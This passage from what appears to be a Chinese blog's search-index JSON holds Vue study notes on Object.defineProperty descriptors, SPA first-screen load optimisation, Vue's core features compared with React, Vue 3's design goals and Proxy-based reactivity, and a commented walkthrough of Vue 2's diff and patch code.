attr in obj )&#123;    console.log( attr );  //newKey&#125;\n\n2.2.4 configurable\n是否可以删除目标属性或是否可以再次修改属性的特性（writable, configurable, enumerable）。设置为true可以被删除或可以重新设置特性；设置为false，不能被可以被删除或不可以重新设置特性。默认为false\n\n这个属性起到两个作用\n\n目标属性是否可以使用delete删除\n目标属性是否可以再次设置特性\n\n//-----------------测试目标属性是否能被删除------------------------var obj = &#123;&#125;//第一种情况：configurable设置为false，不能被删除。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:false,    configurable:false&#125;);//删除属性delete obj.newKey;console.log( obj.newKey ); //hello//第二种情况：configurable设置为true，可以被删除。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:false,    configurable:true&#125;);//删除属性delete obj.newKey;console.log( obj.newKey ); //undefined//-----------------测试是否可以再次修改特性------------------------var obj = &#123;&#125;//第一种情况：configurable设置为false，不能再次修改特性。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:false,    configurable:false&#125;);//重新修改特性Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:true,    enumerable:true,    configurable:true&#125;);console.log( obj.newKey ); //报错：Uncaught TypeError: Cannot redefine property: newKey//第二种情况：configurable设置为true，可以再次修改特性。Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:false,    enumerable:false,    configurable:true&#125;);//重新修改特性Object.defineProperty(obj,&quot;newKey&quot;,&#123;    value:&quot;hello&quot;,    writable:true,    enumerable:true,    configurable:true&#125;);console.log( obj.newKey ); //hello\n\n\n除了可以给新定义的属性设置特性，也可以给已有的属性设置特性\n\n//定义对象的时候添加的属性，是可删除、可重写、可枚举的。var obj = &#123;    test:&quot;hello&quot;&#125;//改写值obj.test = &#x27;change value&#x27;;console.log( obj.test ); //&#x27;change value&#x27;Object.defineProperty(obj,&quot;test&quot;,&#123;    writable:false&#125;)//再次改写值obj.test = &#x27;change value again&#x27;;console.log( obj.test ); //依然是：&#x27;change value&#x27;\n\n\n提示：一旦使用Object.defineProperty给对象添加属性，那么如果不设置属性的特性，那么configurable、enumerable、writable这些值都为默认的false\n\nvar obj = &#123;&#125;;//定义的新属性后，这个属性的特性中configurable，enumerable，writable都为默认的值false//这就导致了neykey这个是不能重写、不能枚举、不能再次设置特性//Object.defineProperty(obj,&#x27;newKey&#x27;,&#123;&#125;);//设置值obj.newKey = &#x27;hello&#x27;;console.log(obj.newKey);  //undefined//枚举for( var attr in obj )&#123;    console.log(attr);&#125;\n\n设置的特性总结\n\nvalue: 设置属性的值\nwritable: 值是否可以重写。true | false\nenumerable: 目标属性是否可以被枚举。true | false\nconfigurable: 目标属性是否可以被删除或是否可以再次修改特性 true | false\n\n2.3 存取器描述2.3.1 定义\n当使用存取器描述属性的特性的时候，允许设置以下特性属性\n\nvar obj = &#123;&#125;;Object.defineProperty(obj,&quot;newKey&quot;,&#123;    get:function ()&#123;&#125; | undefined,    set:function (value)&#123;&#125; | undefined    configurable: true | false    enumerable: true | false&#125;);\n\n\n注意：当使用了getter或setter方法，不允许使用writable和value这两个属性\n\n2.3.2 getter&#x2F;setter\n当设置或获取对象的某个属性的值的时候，可以提供getter/setter方法。\n\n\ngetter 是一种获得属性值的方法\nsetter是一种设置属性值的方法\n\n\n在特性中使用get/set属性来定义对应的方法\n\nvar obj = &#123;&#125;;var initValue = &#x27;hello&#x27;;Object.defineProperty(obj,&quot;newKey&quot;,&#123;    get:function ()&#123;        //当获取值的时候触发的函数        return initValue;        &#125;,    set:function (value)&#123;        //当设置值的时候触发的函数,设置的新值通过参数value拿到        initValue = value;    &#125;&#125;);//获取值console.log( obj.newKey );  //hello//设置值obj.newKey = &#x27;change value&#x27;;console.log( obj.newKey ); //change value\n\n\n注意：get或set不是必须成对出现，任写其一就可以。如果不设置方法，则get和set的默认值为undefined\n\n","categories":["框架"],"tags":["vue"]},{"title":"SPA首屏加载优化","url":"/2018/06/15/Vue/SPA%E9%A6%96%E5%B1%8F%E5%8A%A0%E8%BD%BD%E4%BC%98%E5%8C%96/","content":"面试官：SPA首屏加载速度慢的怎么解决？\n一、什么是首屏加载首屏时间（First Contentful Paint），指的是浏览器从响应用户输入网址地址，到首屏内容渲染完成的时间，此时整个网页不一定要全部渲染完成，但需要展示当前视窗需要的内容\n首屏加载可以说是用户体验中最重要的环节\n关于计算首屏时间利用performance.timing提供的数据：\n\n通过DOMContentLoad或者performance来计算出首屏时间\n// 方案一：document.addEventListener(&#x27;DOMContentLoaded&#x27;, (event) =&gt; &#123;    console.log(&#x27;first contentful painting&#x27;);&#125;);// 方案二：performance.getEntriesByName(&quot;first-contentful-paint&quot;)[0].startTime// performance.getEntriesByName(&quot;first-contentful-paint&quot;)[0]// 会返回一个 PerformancePaintTiming的实例，结构如下：&#123;  name: &quot;first-contentful-paint&quot;,  entryType: &quot;paint&quot;,  startTime: 507.80000002123415,  duration: 0,&#125;;\n\n\n\n二、加载慢的原因在页面渲染的过程，导致加载速度慢的因素可能如下：\n\n网络延时问题\n资源文件体积是否过大\n资源是否重复发送请求去加载了\n加载脚本的时候，渲染内容堵塞了\n\n三、解决方案常见的几种SPA首屏优化方式\n\n减小入口文件积\n静态资源本地缓存\nUI框架按需加载\n图片资源的压缩\n组件重复打包\n开启GZip压缩\n使用SSR\n\n减小入口文件体积常用的手段是路由懒加载，把不同路由对应的组件分割成不同的代码块，待路由被请求的时候会单独打包路由，使得入口文件变小，加载速度大大增加\n\n在vue-router配置路由的时候，采用动态加载路由的形式\nroutes:[     path: &#x27;Blogs&#x27;,    name: &#x27;ShowBlogs&#x27;,    component: () =&gt; import(&#x27;./components/ShowBlogs.vue&#x27;)]\n\n\n\n以函数的形式加载路由，这样就可以把各自的路由文件分别打包，只有在解析给定的路由时，才会加载路由组件\n静态资源本地缓存后端返回资源问题：\n\n采用HTTP缓存，设置Cache-Control，Last-Modified，Etag等响应头\n采用Service Worker离线缓存\n\n前端合理利用localStorage\nUI框架按需加载在日常使用UI框架，例如element-UI、或者antd，我们经常性直接引用整个UI库\nimport ElementUI from &#x27;element-ui&#x27;Vue.use(ElementUI)\n\n\n\n但实际上我用到的组件只有按钮，分页，表格，输入与警告 所以我们要按需引用\nimport &#123; Button, Input, Pagination, Table, TableColumn, MessageBox &#125; from &#x27;element-ui&#x27;;Vue.use(Button)Vue.use(Input)Vue.use(Pagination)\n\n\n\n组件重复打包假设A.js文件是一个常用的库，现在有多个路由使用了A.js文件，这就造成了重复下载\n解决方案：在webpack的config文件中，修改CommonsChunkPlugin的配置\nminChunks: 3\n\n\n\nminChunks为3表示会把使用3次及以上的包抽离出来，放进公共依赖文件，避免了重复加载组件\n图片资源的压缩图片资源虽然不在编码过程中，但它却是对页面性能影响最大的因素\n对于所有的图片资源，我们可以进行适当的压缩\n对页面上使用到的icon，可以使用在线字体图标，或者雪碧图，将众多小图标合并到同一张图上，用以减轻http请求压力。\n开启GZip压缩拆完包之后，我们再用gzip做一下压缩 安装compression-webpack-plugin\ncnmp i compression-webpack-plugin -D\n\n\n\n在vue.congig.js中引入并修改webpack配置\nconst CompressionPlugin = require(&#x27;compression-webpack-plugin&#x27;)configureWebpack: (config) =&gt; &#123;        if (process.env.NODE_ENV === &#x27;production&#x27;) &#123;            // 为生产环境修改配置...            config.mode = &#x27;production&#x27;            return &#123;                plugins: [new CompressionPlugin(&#123;                    test: /\\.js$|\\.html$|\\.css/, //匹配文件名                    threshold: 10240, //对超过10k的数据进行压缩                    deleteOriginalAssets: false //是否删除原文件                &#125;)]            &#125;        &#125;\n\n\n\n在服务器我们也要做相应的配置 如果发送请求的浏览器支持gzip，就发送给它gzip格式的文件 我的服务器是用express框架搭建的 只要安装一下compression就能使用\nconst compression = require(&#x27;compression&#x27;)app.use(compression())  // 在其他中间件使用之前调用\n\n使用SSRSSR（Server side ），也就是服务端渲染，组件或页面通过服务器生成html字符串，再发送到浏览器\n从头搭建一个服务端渲染是很复杂的，vue应用建议使用Nuxt.js实现服务端渲染\n小结：减少首屏渲染时间的方法有很多，总的来讲可以分成两大部分 ：资源加载优化 和 页面渲染优化\n下图是更为全面的首屏优化的方案\n\n大家可以根据自己项目的情况选择各种方式进行首屏渲染的优化\n","categories":["框架"],"tags":["vue"]},{"title":"vue是什么","url":"/2018/08/20/Vue/Vue%E6%98%AF%E4%BB%80%E4%B9%88/","content":"二、vue是什么Vue.js（&#x2F;vjuː&#x2F;，或简称为Vue）是一个用于创建用户界面的开源JavaScript框架，也是一个创建单页应用的Web应用框架。构建出一款相当轻量的框架最早发布于2014年2月\n三、Vue核心特性数据驱动（MVVM)MVVM`表示的是 `Model-View-ViewModel\n\n\nModel：模型层，负责处理业务逻辑以及和服务器端进行交互\nView：视图层：负责将数据模型转化为UI展示出来，可以简单的理解为HTML页面\nViewModel：视图模型层，用来连接Model和View，是Model和View之间的通信桥梁\n\n这时候需要一张直观的关系图，如下 \n组件化1.什么是组件化一句话来说就是把图形、非图形的各种逻辑均抽象为一个统一的概念（组件）来实现开发的模式，在Vue中每一个.vue文件都可以视为一个组件2.组件化的优势\n\n降低整个系统的耦合度，在保持接口不变的情况下，我们可以替换不同的组件快速完成需求，例如输入框，可以替换为日历、时间、范围等组件作具体的实现\n调试方便，由于整个系统是通过组件组合起来的，在出现问题的时候，可以用排除法直接移除组件，或者根据报错的组件快速定位问题，之所以能够快速定位，是因为每个组件之间低耦合，职责单一，所以逻辑会比分析整个系统要简单\n提高可维护性，由于每个组件的职责单一，并且组件在系统中是被复用的，所以对代码进行优化可获得系统的整体升级\n\n指令系统解释：指令 (Directives) 是带有 v- 前缀的特殊属性作用：当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM\n\n常用的指令\n条件渲染指令 v-if\n列表渲染指令v-for\n属性绑定指令v-bind\n事件绑定指令v-on\n双向数据绑定指令v-model\n\n\n\n没有指令之前我们是怎么做的？是不是先要获取到DOM然后在….干点啥\n四、Vue跟传统开发的区别没有落地使用场景的革命不是好革命，就以一个高频的应用场景来示意吧注册账号这个需求大家应该很熟悉了，如下\n\n用jquery来实现大概的思路就是选择流程dom对象，点击按钮隐藏当前活动流程dom对象，显示下一流程dom对象如下图(代码就不上了，上了就篇文章就没了..)\n\n用vue来实现，我们知道vue基本不操作dom节点， 双向绑定使dom节点跟视图绑定后，通过修改变量的值控制dom节点的各类属性。所以其实现思路为：视图层使用一变量控制dom节点显示与否，点击按钮则改变该变量，如下图\n\n总结就是：\n\nVue所有的界面事件，都是只去操作数据的，Jquery操作DOM\nVue所有界面的变动，都是根据数据自动绑定出来的，Jquery操作DOM\n\n五、vue和react对比五、Vue和React对比这里就做几个简单的类比吧，当然没有好坏之分，只是使用场景不同\n相同点\n都有组件化思想\n都支持服务器端渲染\n都有Virtual DOM（虚拟dom）\n数据驱动视图\n都有支持native的方案：Vue的weex、React的React native\n都有自己的构建工具：Vue的vue-cli、React的Create React App\n\n区别\n数据流向的不同。react从诞生开始就推崇单向数据流，而Vue是双向数据流\n数据变化的实现原理不同。react使用的是不可变数据，而Vue使用的是可变的数据\n组件化通信的不同。react中我们通过使用回调函数来进行通信的，而Vue中子组件向父组件传递消息有两种方式：事件和回调函数\ndiff算法不同。react主要使用diff队列保存需要更新哪些DOM，得到patch树，再统一操作批量更新DOM。Vue 使用双向指针，边对比，边更新DOM\n\n","categories":["框架"],"tags":["vue"]},{"title":"Vue3-设计目标、做了哪些优化","url":"/2021/10/11/Vue/Vue3-%E8%AE%BE%E8%AE%A1%E7%9B%AE%E6%A0%87%E3%80%81%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E4%BC%98%E5%8C%96/","content":"一、设计目标不以解决实际业务痛点的更新都是耍流氓，下面我们来列举一下Vue3之前我们或许会面临的问题\n\n随着功能的增长，复杂组件的代码变得越来越难以维护\n缺少一种比较「干净」的在多个组件之间提取和复用逻辑的机制\n类型推断不够友好\nbundle的时间太久了\n\n而 Vue3 经过长达两三年时间的筹备，做了哪些事情？\n我们从结果反推\n\n更小\n更快\nTypeScript支持\nAPI设计一致性\n提高自身可维护性\n开放更多底层功能\n\n一句话概述，就是更小更快更友好了\n更小Vue3`移除一些不常用的 `API\n\n引入tree-shaking，可以将无用模块“剪辑”，仅打包需要的，使打包的整体体积变小了\n更快主要体现在编译方面：\n\ndiff算法优化\n静态提升\n事件监听缓存\nSSR优化\n\n下篇文章我们会进一步介绍\n更友好vue3在兼顾vue2的options API的同时还推出了composition API，大大增加了代码的逻辑组织和代码复用能力\n这里代码简单演示下：\n存在一个获取鼠标位置的函数\nimport &#123; toRefs, reactive &#125; from &#x27;vue&#x27;;function useMouse()&#123;    const state = reactive(&#123;x:0,y:0&#125;);    const update = e=&gt;&#123;        state.x = e.pageX;        state.y = e.pageY;    &#125;    onMounted(()=&gt;&#123;        window.addEventListener(&#x27;mousemove&#x27;,update);    &#125;)    onUnmounted(()=&gt;&#123;        window.removeEventListener(&#x27;mousemove&#x27;,update);    &#125;)    return toRefs(state);&#125;\n\n我们只需要调用这个函数，即可获取x、y的坐标，完全不用关注实现过程\n试想一下，如果很多类似的第三方库，我们只需要调用即可，不必关注实现过程，开发效率大大提高\n同时，VUE3是基于typescipt编写的，可以享受到自动的类型定义提示\n三、优化方案vue3从很多层面都做了优化，可以分成三个方面：\n\n源码\n性能\n语法 API\n\n源码源码可以从两个层面展开：\n\n源码管理\nTypeScript\n\n源码管理vue3整个源码是通过 monorepo的方式维护的，根据功能将不同的模块拆分到packages目录下面不同的子目录中\n\n这样使得模块拆分更细化，职责划分更明确，模块之间的依赖关系也更加明确，开发人员也更容易阅读、理解和更改所有模块源码，提高代码的可维护性\n另外一些 package（比如 reactivity 响应式库）是可以独立于 Vue 使用的，这样用户如果只想使用 Vue3的响应式能力，可以单独依赖这个响应式库而不用去依赖整个 Vue\nTypeScriptVue3是基于typeScript编写的，提供了更好的类型检查，能支持复杂的类型推导\n性能vue3是从什么哪些方面对性能进行进一步优化呢？\n\n体积优化\n编译优化\n数据劫持优化\n\n这里讲述数据劫持：\n在vue2中，数据劫持是通过Object.defineProperty，这个 API 有一些缺陷，并不能检测对象属性的添加和删除\nObject.defineProperty(data, &#x27;a&#x27;,&#123;  get()&#123;    // track  &#125;,  set()&#123;    // trigger  &#125;&#125;)\n\n尽管Vue为了解决这个问题提供了 set和delete实例方法，但是对于用户来说，还是增加了一定的心智负担\n同时在面对嵌套层级比较深的情况下，就存在性能问题\ndefault &#123;  data: &#123;    a: &#123;      b: &#123;          c: &#123;          d: 1        &#125;      &#125;    &#125;  &#125;&#125;\n\n相比之下，vue3是通过proxy监听整个对象，那么对于删除还是监听当然也能监听到\n同时Proxy 并不能监听到内部深层次的对象变化，而 Vue3 的处理方式是在getter 中去递归响应式，这样的好处是真正访问到的内部对象才会变成响应式，而不是无脑递归\n语法 API这里当然说的就是composition API，其两大显著的优化：\n\n优化逻辑组织\n优化逻辑复用\n\n逻辑组织一张图，我们可以很直观地感受到 Composition API在逻辑组织方面的优势\n\n相同功能的代码编写在一块，而不像options API那样，各个功能的代码混成一块\n逻辑复用在vue2中，我们是通过mixin实现功能混合，如果多个mixin混合，会存在两个非常明显的问题：命名冲突和数据来源不清晰\n而通过composition这种形式，可以将一些复用的代码抽离出来作为一个函数，只要的使用的地方直接进行调用即可\n同样是上文的获取鼠标位置的例子\nimport &#123; toRefs, reactive, onUnmounted, onMounted &#125; from &#x27;vue&#x27;;function useMouse()&#123;    const state = reactive(&#123;x:0,y:0&#125;);    const update = e=&gt;&#123;        state.x = e.pageX;        state.y = e.pageY;    &#125;    onMounted(()=&gt;&#123;        window.addEventListener(&#x27;mousemove&#x27;,update);    &#125;)    onUnmounted(()=&gt;&#123;        window.removeEventListener(&#x27;mousemove&#x27;,update);    &#125;)    return toRefs(state);&#125;\n\n组件使用\nimport useMousePosition from &#x27;./mouse&#x27;export default &#123;    setup() &#123;        const &#123; x, y &#125; = useMousePosition()        return &#123; x, y &#125;    &#125;&#125;\n\n可以看到，整个数据来源清晰了，即使去编写更多的hook函数，也不会出现命名冲突的问题\n","categories":["框架"],"tags":["vue"]},{"title":"vue-diff算法","url":"/2018/05/31/Vue/diff%E7%AE%97%E6%B3%95/","content":"一、是什么diff 算法是一种通过同层的树节点进行比较的高效算法\n其有两个特点：\n\n比较只会在同层级进行, 不会跨层级比较\n在diff比较的过程中，循环从两边向中间比较\n\ndiff 算法在很多场景下都有应用，在 vue 中，作用于虚拟 dom 渲染成真实 dom 的新旧 VNode 节点比较\n二、比较方式diff整体策略为：深度优先，同层比较\n\n比较只会在同层级进行, 不会跨层级比较\n\n\n\n比较的过程中，循环从两边向中间收拢\n\n\n下面举个vue通过diff算法更新的例子：\n新旧VNode节点如下图所示：\n\n第一次循环后，发现旧节点D与新节点D相同，直接复用旧节点D作为diff后的第一个真实节点，同时旧节点endIndex移动到C，新节点的 startIndex 移动到了 C\n\n第二次循环后，同样是旧节点的末尾和新节点的开头(都是 C)相同，同理，diff 后创建了 C 的真实节点插入到第一次创建的 B 节点后面。同时旧节点的 endIndex 移动到了 B，新节点的 startIndex 移动到了 E\n\n第三次循环中，发现E没有找到，这时候只能直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 startIndex 移动到了 A。旧节点的 startIndex 和 endIndex 都保持不动\n\n第四次循环中，发现了新旧节点的开头(都是 A)相同，于是 diff 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 startIndex 移动到了 B，新节点的startIndex 移动到了 B\n\n第五次循环中，情形同第四次循环一样，因此 diff 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 startIndex移动到了 C，新节点的 startIndex 移动到了 F\n\n新节点的 startIndex 已经大于 endIndex 了，需要创建 newStartIdx 和 newEndIdx 之间的所有节点，也就是节点F，直接创建 F 节点对应的真实节点放到 B 节点后面\n\n三、原理分析当数据发生改变时，set方法会调用Dep.notify通知所有订阅者Watcher，订阅者就会调用patch给真实的DOM打补丁，更新相应的视图\n源码位置：src&#x2F;core&#x2F;vdom&#x2F;patch.js\nfunction patch(oldVnode, vnode, hydrating, removeOnly) &#123;    if (isUndef(vnode)) &#123; // 没有新节点，直接执行destory钩子函数        if (isDef(oldVnode)) invokeDestroyHook(oldVnode)        return    &#125;    let isInitialPatch = false    const insertedVnodeQueue = []    if (isUndef(oldVnode)) &#123;        isInitialPatch = true        createElm(vnode, insertedVnodeQueue) // 没有旧节点，直接用新节点生成dom元素    &#125; else &#123;        const isRealElement = isDef(oldVnode.nodeType)        if (!isRealElement &amp;&amp; sameVnode(oldVnode, vnode)) &#123;            // 判断旧节点和新节点自身一样，一致执行patchVnode            patchVnode(oldVnode, vnode, insertedVnodeQueue, null, null, removeOnly)        &#125; else &#123;            // 否则直接销毁及旧节点，根据新节点生成dom元素            if (isRealElement) &#123;                if (oldVnode.nodeType === 1 &amp;&amp; oldVnode.hasAttribute(SSR_ATTR)) &#123;                    oldVnode.removeAttribute(SSR_ATTR)                    hydrating = true                &#125;                if (isTrue(hydrating)) &#123;                    if (hydrate(oldVnode, vnode, insertedVnodeQueue)) &#123;                        invokeInsertHook(vnode, insertedVnodeQueue, true)                        return oldVnode                    &#125;                &#125;                oldVnode = emptyNodeAt(oldVnode)            &#125;            return vnode.elm        &#125;    &#125;&#125;\n\npatch函数前两个参数位为oldVnode 和 Vnode ，分别代表新的节点和之前的旧节点，主要做了四个判断：\n\n没有新节点，直接触发旧节点的destory钩子\n没有旧节点，说明是页面刚开始初始化的时候，此时，根本不需要比较了，直接全是新建，所以只调用 createElm\n旧节点和新节点自身一样，通过 sameVnode 判断节点是否一样，一样时，直接调用 patchVnode去处理这两个节点\n旧节点和新节点自身不一样，当两个节点不一样的时候，直接创建新节点，删除旧节点\n\n下面主要讲的是patchVnode部分\nfunction patchVnode (oldVnode, vnode, insertedVnodeQueue, removeOnly) &#123;    // 如果新旧节点一致，什么都不做    if (oldVnode === vnode) &#123;      return    &#125;    // 让vnode.el引用到现在的真实dom，当el修改时，vnode.el会同步变化    const elm = vnode.elm = oldVnode.elm    // 异步占位符    if (isTrue(oldVnode.isAsyncPlaceholder)) &#123;      if (isDef(vnode.asyncFactory.resolved)) &#123;        hydrate(oldVnode.elm, vnode, insertedVnodeQueue)      &#125; else &#123;        vnode.isAsyncPlaceholder = true      &#125;      return    &#125;    // 如果新旧都是静态节点，并且具有相同的key    // 当vnode是克隆节点或是v-once指令控制的节点时，只需要把oldVnode.elm和oldVnode.child都复制到vnode上    // 也不用再有其他操作    if (isTrue(vnode.isStatic) &amp;&amp;      isTrue(oldVnode.isStatic) &amp;&amp;      vnode.key === oldVnode.key &amp;&amp;      (isTrue(vnode.isCloned) || isTrue(vnode.isOnce))    ) &#123;      vnode.componentInstance = oldVnode.componentInstance      return    &#125;    let i    const data = vnode.data    if (isDef(data) &amp;&amp; isDef(i = data.hook) &amp;&amp; isDef(i = i.prepatch)) &#123;      i(oldVnode, vnode)    &#125;    const oldCh = oldVnode.children    const ch = vnode.children    if (isDef(data) &amp;&amp; isPatchable(vnode)) &#123;      for (i = 0; i &lt; cbs.update.length; ++i) cbs.update[i](oldVnode, vnode)      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.update)) i(oldVnode, vnode)    &#125;    // 如果vnode不是文本节点或者注释节点    if (isUndef(vnode.text)) &#123;      // 并且都有子节点      if (isDef(oldCh) &amp;&amp; isDef(ch)) &#123;        // 并且子节点不完全一致，则调用updateChildren        if (oldCh !== ch) updateChildren(elm, oldCh, ch, insertedVnodeQueue, removeOnly)        // 如果只有新的vnode有子节点      &#125; else if (isDef(ch)) &#123;        if (isDef(oldVnode.text)) nodeOps.setTextContent(elm, &#x27;&#x27;)        // elm已经引用了老的dom节点，在老的dom节点上添加子节点        addVnodes(elm, null, ch, 0, ch.length - 1, insertedVnodeQueue)        // 如果新vnode没有子节点，而vnode有子节点，直接删除老的oldCh      &#125; else if (isDef(oldCh)) &#123;        removeVnodes(elm, oldCh, 0, oldCh.length - 1)        // 如果老节点是文本节点      &#125; else if (isDef(oldVnode.text)) &#123;        nodeOps.setTextContent(elm, &#x27;&#x27;)      &#125;      // 如果新vnode和老vnode是文本节点或注释节点      // 但是vnode.text != oldVnode.text时，只需要更新vnode.elm的文本内容就可以    &#125; else if (oldVnode.text !== vnode.text) &#123;      nodeOps.setTextContent(elm, vnode.text)    &#125;    if (isDef(data)) &#123;      if (isDef(i = data.hook) &amp;&amp; isDef(i = i.postpatch)) i(oldVnode, vnode)    &#125;  &#125;\n\npatchVnode主要做了几个判断：\n\n新节点是否是文本节点，如果是，则直接更新dom的文本内容为新节点的文本内容\n新节点和旧节点如果都有子节点，则处理比较更新子节点\n只有新节点有子节点，旧节点没有，那么不用比较了，所有节点都是全新的，所以直接全部新建就好了，新建是指创建出所有新DOM，并且添加进父节点\n只有旧节点有子节点而新节点没有，说明更新后的页面，旧节点全部都不见了，那么要做的，就是把所有的旧节点删除，也就是直接把DOM 删除\n\n子节点不完全一致，则调用updateChildren\nfunction updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) &#123;    let oldStartIdx = 0 // 旧头索引    let newStartIdx = 0 // 新头索引    let oldEndIdx = oldCh.length - 1 // 旧尾索引    let newEndIdx = newCh.length - 1 // 新尾索引    let oldStartVnode = oldCh[0] // oldVnode的第一个child    let oldEndVnode = oldCh[oldEndIdx] // oldVnode的最后一个child    let newStartVnode = newCh[0] // newVnode的第一个child    let newEndVnode = newCh[newEndIdx] // newVnode的最后一个child    let oldKeyToIdx, idxInOld, vnodeToMove, refElm    // removeOnly is a special flag used only by &lt;transition-group&gt;    // to ensure removed elements stay in correct relative positions    // during leaving transitions    const canMove = !removeOnly    // 如果oldStartVnode和oldEndVnode重合，并且新的也都重合了，证明diff完了，循环结束    while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) &#123;      // 如果oldVnode的第一个child不存在      if (isUndef(oldStartVnode)) &#123;        // oldStart索引右移        oldStartVnode = oldCh[++oldStartIdx] // Vnode has been moved left      // 如果oldVnode的最后一个child不存在      &#125; else if (isUndef(oldEndVnode)) &#123;        // oldEnd索引左移        oldEndVnode = oldCh[--oldEndIdx]      // oldStartVnode和newStartVnode是同一个节点      &#125; else if (sameVnode(oldStartVnode, newStartVnode)) &#123;        // patch oldStartVnode和newStartVnode， 索引左移，继续循环        patchVnode(oldStartVnode, newStartVnode, insertedVnodeQueue)        oldStartVnode = oldCh[++oldStartIdx]        newStartVnode = newCh[++newStartIdx]      // oldEndVnode和newEndVnode是同一个节点      &#125; else if (sameVnode(oldEndVnode, newEndVnode)) &#123;        // patch oldEndVnode和newEndVnode，索引右移，继续循环        patchVnode(oldEndVnode, newEndVnode, insertedVnodeQueue)        oldEndVnode = oldCh[--oldEndIdx]        newEndVnode = newCh[--newEndIdx]      // oldStartVnode和newEndVnode是同一个节点      &#125; else if (sameVnode(oldStartVnode, newEndVnode)) &#123; // Vnode moved right        // patch oldStartVnode和newEndVnode        patchVnode(oldStartVnode, newEndVnode, insertedVnodeQueue)        // 如果removeOnly是false，则将oldStartVnode.eml移动到oldEndVnode.elm之后        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldStartVnode.elm, nodeOps.nextSibling(oldEndVnode.elm))        // oldStart索引右移，newEnd索引左移        oldStartVnode = oldCh[++oldStartIdx]        newEndVnode = newCh[--newEndIdx]      // 如果oldEndVnode和newStartVnode是同一个节点      &#125; else if (sameVnode(oldEndVnode, newStartVnode)) &#123; // Vnode moved left        // patch oldEndVnode和newStartVnode        patchVnode(oldEndVnode, newStartVnode, insertedVnodeQueue)        // 如果removeOnly是false，则将oldEndVnode.elm移动到oldStartVnode.elm之前        canMove &amp;&amp; nodeOps.insertBefore(parentElm, oldEndVnode.elm, oldStartVnode.elm)        // oldEnd索引左移，newStart索引右移        oldEndVnode = oldCh[--oldEndIdx]        newStartVnode = newCh[++newStartIdx]      // 如果都不匹配      &#125; else &#123;        if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)        // 尝试在oldChildren中寻找和newStartVnode的具有相同的key的Vnode        idxInOld = isDef(newStartVnode.key)          ? oldKeyToIdx[newStartVnode.key]          : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx)        // 如果未找到，说明newStartVnode是一个新的节点        if (isUndef(idxInOld)) &#123; // New element          // 创建一个新Vnode          createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm)        // 如果找到了和newStartVnodej具有相同的key的Vnode，叫vnodeToMove        &#125; else &#123;          vnodeToMove = oldCh[idxInOld]          /* istanbul ignore if */          if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; !vnodeToMove) &#123;            warn(              &#x27;It seems there are duplicate keys that is causing an update error. &#x27; +              &#x27;Make sure each v-for item has a unique key.&#x27;            )          &#125;          // 比较两个具有相同的key的新节点是否是同一个节点          //不设key，newCh和oldCh只会进行头尾两端的相互比较，设key后，除了头尾两端的比较外，还会从用key生成的对象oldKeyToIdx中查找匹配的节点，所以为节点设置key可以更高效的利用dom。          if (sameVnode(vnodeToMove, newStartVnode)) &#123;            // patch vnodeToMove和newStartVnode            patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue)            // 清除            oldCh[idxInOld] = undefined            // 如果removeOnly是false，则将找到的和newStartVnodej具有相同的key的Vnode，叫vnodeToMove.elm            // 移动到oldStartVnode.elm之前            canMove &amp;&amp; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm)          // 如果key相同，但是节点不相同，则创建一个新的节点          &#125; else &#123;            // same key but different element. treat as new element            createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm)          &#125;        &#125;        // 右移        newStartVnode = newCh[++newStartIdx]      &#125;    &#125;\n\nwhile循环主要处理了以下五种情景：\n\n当新老 VNode 节点的 start 相同时，直接 patchVnode ，同时新老 VNode 节点的开始索引都加 1\n当新老 VNode 节点的 end相同时，同样直接 patchVnode ，同时新老 VNode 节点的结束索引都减 1\n当老 VNode 节点的 start 和新 VNode 节点的 end 相同时，这时候在 patchVnode 后，还需要将当前真实 dom 节点移动到 oldEndVnode 的后面，同时老 VNode 节点开始索引加 1，新 VNode 节点的结束索引减 1\n当老 VNode 节点的 end 和新 VNode 节点的 start 相同时，这时候在 patchVnode 后，还需要将当前真实 dom 节点移动到 oldStartVnode 的前面，同时老 VNode 节点结束索引减 1，新 VNode节点的开始索引加 1\n如果都不满足以上四种情形，那说明没有相同的节点可以复用，则会分为以下两种情况：\n从旧的 VNode 为 key 值，对应 index 序列为 value 值的哈希表中找到与 newStartVnode 一致 key 的旧的 VNode 节点，再进行patchVnode，同时将这个真实 dom移动到 oldStartVnode对应的真实 dom 的前面\n调用 createElm 创建一个新的 dom 节点放到当前 newStartIdx 的位置\n\n\n\n小结\n当数据发生改变时，订阅者watcher就会调用patch给真实的DOM打补丁\n\n通过isSameVnode进行判断，相同则调用patchVnode方法\npatchVnode做了以下操作：\n\n找到对应的真实dom，称为el\n如果都有都有文本节点且不相等，将el文本节点设置为Vnode的文本节点\n如果oldVnode有子节点而VNode没有，则删除el子节点\n如果oldVnode没有子节点而VNode有，则将VNode的子节点真实化后添加到el\n如果两者都有子节点，则执行updateChildren函数比较子节点\n\nupdateChildren主要做了以下操作：\n\n设置新旧VNode的头尾指针\n新旧头尾指针进行比较，循环向中间靠拢，根据情况调用patchVnode进行patch重复流程、调用createElem创建一个新节点，从哈希表寻找 key一致的VNode 